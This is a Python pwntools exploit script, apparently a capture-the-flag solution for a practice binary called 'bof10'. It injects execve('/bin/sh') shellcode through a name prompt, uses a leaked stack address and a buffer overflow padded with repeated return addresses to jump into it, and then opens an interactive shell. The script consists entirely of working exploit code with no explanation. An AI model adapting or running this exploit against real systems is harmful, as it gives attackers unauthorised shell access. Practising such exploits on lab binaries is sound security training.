#!/bin/python3
from pwn import *
exe = ELF('./bof10')
shellcode = asm('''
    mov rax,0x3b 
    mov rdi, 29400045130965551
    push rdi 
    mov rdi, rsp 
    xor rsi, rsi 
    xor rdx,rdx
       syscall
                ''', arch='amd64')
p = process(exe.path)
context.terminal = ['alacritty','-e']
gdb.attach(p,gdbscript='''

b*play_game+138
           c

           ''') 
p.sendlineafter(b'Your name: ', shellcode)
p.recvline()
p.recvline()
p.recvuntil(b'I have a gift for you: ')
char1_leak = int(p.recvline(),16)
log.info("char1_leak: " + hex(char1_leak))
payload = p64(0x00401357)*59 + p64(char1_leak - 48) +shellcode
payload = payload.ljust(0x200,b'\x00')
p.sendlineafter(b'Say something:',payload)

p.interactive()

